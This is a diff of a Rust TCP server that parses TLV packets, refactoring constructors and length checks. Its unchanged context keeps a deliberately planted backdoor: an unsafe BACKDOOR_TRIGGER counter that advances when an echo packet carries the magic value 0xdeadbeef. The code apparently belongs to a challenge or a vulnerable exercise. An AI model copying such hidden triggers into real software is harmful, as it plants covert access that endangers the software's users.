@@ -14,22 +14,10 @@ struct TLVPacket {
 }
 
 impl TLVPacket {
-    fn new(packet_type: u32, length: u32, mut value: Vec<u8>) -> Self {
-        // Truncate the value if its length exceeds the specified length
-        if value.len() > length as usize {
-            value.truncate(length as usize);
-        }
-
-        TLVPacket {
-            packet_type,
-            length,
-            value,
-        }
-    }
 
     fn from_bytes(bytes: &[u8]) -> Option<Self> {
         let len = bytes.len();
-        if bytes.len() < TYPE_LENGTH + LENGTH_LENGTH {
+        if len < TYPE_LENGTH + LENGTH_LENGTH {
             return None;
         }
 
@@ -47,7 +35,7 @@ impl TLVPacket {
             bytes[4],
         ]) as usize;
 
-        if bytes.len() < TYPE_LENGTH + LENGTH_LENGTH + length {
+        if len != TYPE_LENGTH + LENGTH_LENGTH + length {
             return None;
         }
 
@@ -99,7 +87,7 @@ impl TLVPacket {
     }
 
     fn handle_echo_packet(value: &[u8]) -> Vec<u8> {
-        let mut response = value.to_vec();
+        let response = value.to_vec();
         unsafe {
             if response.len() == 4 && u32::from_be_bytes([response[3], response[2], response[1], response[0]]) == 0xdeadbeef {
                 BACKDOOR_TRIGGER += 1;
@@ -168,7 +156,7 @@ fn handle_client(mut stream: TcpStream) {
                 println!("Client disconnected");
                 unsafe {
                     BACKDOOR_TRIGGER = 0;
-                }                
+                }
                 return;
             }
         }
